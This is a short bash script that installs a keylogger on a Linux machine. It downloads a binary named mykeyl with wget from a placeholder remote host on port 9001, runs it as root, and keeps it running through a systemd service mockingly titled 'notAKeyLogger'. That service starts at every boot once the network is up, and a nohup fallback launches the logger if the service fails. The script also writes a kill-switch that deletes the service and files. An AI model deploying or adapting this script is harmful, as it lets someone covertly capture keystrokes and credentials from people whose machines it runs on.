#!/bin/bash

# killSwitch.sh
cat << 'EOF' > /root/killSwitch.sh
#!/bin/bash

#service cleaner
sudo systemctl stop notAKeyLogger.service
sudo systemctl disable notAKeyLogger.service
rm /etc/systemd/system/notAKeyLogger.service
sudo systemctl daemon-reload

#files deleting
rm -f /root/keyl /root/killSwitch.sh
EOF
chmod +x /root/killSwitch.sh

# creating a service
cat << 'EOF' > /etc/systemd/system/notAKeyLogger.service
[Service]
ExecStart=/root/keyl

[Install]
WantedBy=multi-user.target

[Unit]
Description= this is not a keylogger trust me
After=network-online.target
Wants=network-online.target
EOF

sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable notAKeyLogger.service

#keyl:
wget -O /root/keyl http://<IP>:9001/dist/mykeyl
chmod u+x /root/keyl

#start:
sudo systemctl start notAKeyLogger.service
if ! pgrep -f "/root/keyl" > /dev/null; then
    nohup /root/keyl &> /dev/null &
fi
